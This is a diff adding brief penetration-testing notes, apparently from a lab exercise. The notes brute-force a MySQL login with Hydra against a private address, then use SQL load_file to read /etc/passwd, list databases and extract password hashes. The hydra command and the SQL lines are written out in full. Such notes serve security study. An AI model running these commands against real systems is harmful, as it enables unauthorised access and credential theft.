@@ -1,0 +1,15 @@
+
+1.  Review the open ports on X to identify the MySQL, SSH and PostgreSQL
+2. brute force password cracking tool such as Hydra to identify a MySQL account with weak credentials, and once connected to the MySQL server we can: 
+        - Use the load_file function to read the /etc/passwd file. 
+        - List the databases present 
+        - Extract the data from tables that might contain password hashes / user data. 
+
+
+### Hydra pass cracking ###
+hydra -l root -P /usr/share/metasploit-framework/data/wordlists/password.lst mysql://192.168.3.100
+
+###  Use the load_file function to read the /etc/passwd file ###
+select load_file('/etc/passwd');
+show databases;
+
